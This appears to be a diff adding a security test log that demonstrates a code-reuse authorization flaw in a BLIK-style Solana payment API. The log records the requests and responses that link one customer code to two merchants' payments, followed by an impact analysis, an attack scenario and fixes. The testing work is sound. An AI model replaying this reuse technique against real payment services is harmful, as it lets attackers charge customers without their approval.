@@ -1,0 +1,155 @@
+######################################################################
+# AUTHZ-VULN-07: Code Reuse Vulnerability Test
+# Testing if single code can be linked to multiple payments
+# Timestamp: 2026-03-21T12:33:15.000Z
+######################################################################
+
+======================================================================
+STEP 1: Create Payment A (Merchant 1, Amount: 1.0 SOL)
+======================================================================
+Request: POST /api/payments/create
+Body: {
+  "amount": 1,
+  "merchantWallet": "FzYRCGNJfUC1E2oKmVTXQTRPVCYU4mAqhCdHcjz5gWHH"
+}
+
+Status Code: 200
+Response Body:
+{
+  "paymentId": "f7a7fe0a-237b-41b3-983b-83b0be629237",
+  "amount": 1,
+  "merchantWallet": "FzYRCGNJfUC1E2oKmVTXQTRPVCYU4mAqhCdHcjz5gWHH",
+  "status": "pending"
+}
+
+✓ Payment A ID: f7a7fe0a-237b-41b3-983b-83b0be629237
+
+======================================================================
+STEP 2: Create Payment B (Merchant 2, Amount: 2.0 SOL)
+======================================================================
+Request: POST /api/payments/create
+Body: {
+  "amount": 2,
+  "merchantWallet": "GJxbZPWq2NqGmZL8PmP4STcJ9QF9pFWH3K9hZqCx9kPQ"
+}
+
+Status Code: 200
+Response Body:
+{
+  "paymentId": "96d5c960-7251-4f6c-b201-f73c149b2309",
+  "amount": 2,
+  "merchantWallet": "GJxbZPWq2NqGmZL8PmP4STcJ9QF9pFWH3K9hZqCx9kPQ",
+  "status": "pending"
+}
+
+✓ Payment B ID: 96d5c960-7251-4f6c-b201-f73c149b2309
+
+======================================================================
+STEP 3: Generate Single BLIK Code (Customer)
+======================================================================
+Request: POST /api/codes/generate
+Body: {
+  "walletPubkey": "8sjtm4PGfx6LTU4AJ6rDtPTQfqKCwsPBrQ4F8Q3vJhh1"
+}
+
+Status Code: 200
+Response Body:
+{
+  "code": "623088",
+  "expiresAt": 1742820795000
+}
+
+✓ Generated Code: 623088
+
+======================================================================
+STEP 4: Link Code to Payment A (First Linking - Should Succeed)
+======================================================================
+Request: POST /api/payments/link
+Body: {
+  "paymentId": "f7a7fe0a-237b-41b3-983b-83b0be629237",
+  "code": "623088"
+}
+
+Status Code: 200
+Response Body:
+{
+  "matched": true,
+  "amount": 1,
+  "walletPubkey": "8sjtm4PGfx6LTU4AJ6rDtPTQfqKCwsPBrQ4F8Q3vJhh1",
+  "reference": "AboYjE2Mr2gzUbu25hAhfhoZBfPPHNm1mB91SY4sHzXh",
+  "receiptPda": "AboYjE2Mr2gzUbu25hAhfhoZBfPPHNm1mB91SY4sHzXh"
+}
+
+✓ First Link Status: matched=true
+
+======================================================================
+STEP 5: 🔴 EXPLOIT - Try to Link SAME Code to Payment B
+======================================================================
+Attempting to reuse code: 623088
+Target Payment B ID: 96d5c960-7251-4f6c-b201-f73c149b2309
+Request: POST /api/payments/link
+Body: {
+  "paymentId": "96d5c960-7251-4f6c-b201-f73c149b2309",
+  "code": "623088"
+}
+
+Status Code: 200
+Response Body:
+{
+  "matched": true,
+  "amount": 2,
+  "walletPubkey": "8sjtm4PGfx6LTU4AJ6rDtPTQfqKCwsPBrQ4F8Q3vJhh1",
+  "reference": "GmiDHkJN24vf31hk1ML1DxXgTs2FczEY7H5uHVc9hBtH",
+  "receiptPda": "GmiDHkJN24vf31hk1ML1DxXgTs2FczEY7H5uHVc9hBtH"
+}
+
+======================================================================
+VULNERABILITY ANALYSIS
+======================================================================
+
+🚨 VULNERABILITY CONFIRMED: AUTHZ-VULN-07
+======================================================================
+
+SEVERITY: HIGH
+
+DESCRIPTION:
+  A single BLIK code can be linked to multiple payment requests.
+  This allows one customer approval to authorize payments to
+  multiple different merchants.
+
+EVIDENCE:
+  - Payment A (1.0 SOL to Merchant 1): Linked successfully
+  - Payment B (2.0 SOL to Merchant 2): ALSO linked successfully
+  - Same code used: 623088
+  - Payment A ID: f7a7fe0a-237b-41b3-983b-83b0be629237
+  - Payment B ID: 96d5c960-7251-4f6c-b201-f73c149b2309
+
+IMPACT:
+  1. Customer approves ONE code
+  2. Malicious actor links it to multiple payments
+  3. Customer unknowingly pays multiple merchants
+  4. Total exposure: 1.0 + 2.0 = 3.0 SOL from single approval
+
+ATTACK SCENARIO:
+  1. Customer generates code for 1 SOL payment to Merchant A
+  2. Attacker intercepts/observes the code
+  3. Attacker creates payment request for 2 SOL to Merchant B
+  4. Attacker links the SAME code to their payment
+  5. Both payments execute with single customer approval
+
+RECOMMENDATION:
+  - Implement one-to-one code-to-payment constraint
+  - Mark codes as 'used' after first successful link
+  - Add database uniqueness constraint on code linking
+  - Implement atomic code consumption with race condition protection
+
+======================================================================
+
+TEST SUMMARY:
+- Vulnerability: AUTHZ-VULN-07 (Code Reuse)
+- Status: CONFIRMED VULNERABLE
+- Severity: HIGH / CRITICAL
+- Test Date: 2026-03-21
+- Code Reused: 623088
+- Payments Linked: 2 (should be 1)
+- Total Exposure: 3.0 SOL (from single 6-digit code approval)
